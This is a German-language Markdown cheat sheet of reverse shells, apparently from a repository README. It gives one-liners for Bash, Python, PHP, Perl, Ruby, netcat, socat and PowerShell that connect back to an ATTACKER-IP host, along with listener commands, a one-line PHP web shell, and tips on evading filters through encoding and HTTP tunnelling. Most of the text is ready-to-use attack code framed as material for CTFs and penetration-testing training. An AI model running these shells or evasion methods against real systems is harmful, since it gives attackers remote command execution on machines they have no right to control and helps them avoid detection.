# 🌀 Reverse Shell Cheat Sheet

Diese Datei enthält eine praktische Übersicht gängiger Reverse Shells für verschiedene Programmiersprachen und Tools. Sie dient ausschließlich Schulungs- und Übungszwecken (z. B. in legalen CTFs oder Penetration-Testing-Labs) und richtet sich an White-Hat-Hacker.

> ⚠️ **Haftungsausschluss:** Diese Inhalte sind *nur* für Bildungs- und Forschungskontexte gedacht. Der Missbrauch dieser Techniken ist illegal und strafbar.

---

## 🖥️ Listener vorbereiten

```bash
nc -lvnp 4444        # klassischer Netcat Listener
rlwrap nc -lvnp 4444 # mit Kommandozeilen-History
ncat -lvnp 4444      # Ncat von Nmap
```

---

## 🐚 Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

```bash
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'
```

---

## 🐍 Python Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

Alternative für Python3:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

---

## 🐘 PHP Reverse Shell

```php
php -r '$sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Oder als Webshell-Datei:

```php
<?php system($_GET['cmd']); ?>
```

---

## 🐪 Perl Reverse Shell

```perl
perl -e 'use Socket;$i="ATTACKER-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## 💎 Ruby Reverse Shell

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER-IP",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## 🐚 Netcat (nc) Reverse Shell

```bash
nc -e /bin/sh ATTACKER-IP 4444           # funktioniert nur mit "klassischem" nc
ncat ATTACKER-IP 4444 -e /bin/bash       # funktioniert mit Ncat (von Nmap)
```

Wenn `-e` nicht verfügbar:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER-IP 4444 > /tmp/f
```

---

## ⚙️ Socat Reverse Shell

**Auf dem Angreifer (Listener):**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Auf dem Zielsystem:**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER-IP:4444
```

---

## 🪟 PowerShell Reverse Shell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER-IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

---

## 📌 Tipps zur Anwendung

* ⚠️ **Immer Encoding & Obfuscation bedenken** – viele Filter blockieren bekannte Strings.
* ✏️ Verwende `base64`, URL-Encoding oder zerteilte Zeichenketten zur Umgehung.
* 🔄 Teste auch verschiedene Ports (4444, 1337, 8080 etc.)
* 🔥 Nutze HTTP-Tunnel oder HTTPS für verschleierten Verkehr (z. B. mit `reGeorg`, `chisel`, `frp`).

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay safe – use it ethically! 🛡️

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!


---

## 📚 Quellen & Tools

* [Reverse Shells – PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
* [GTFOBins](https://gtfobins.github.io/)
* [LOLBAS](https://lolbas-project.github.io/)

---


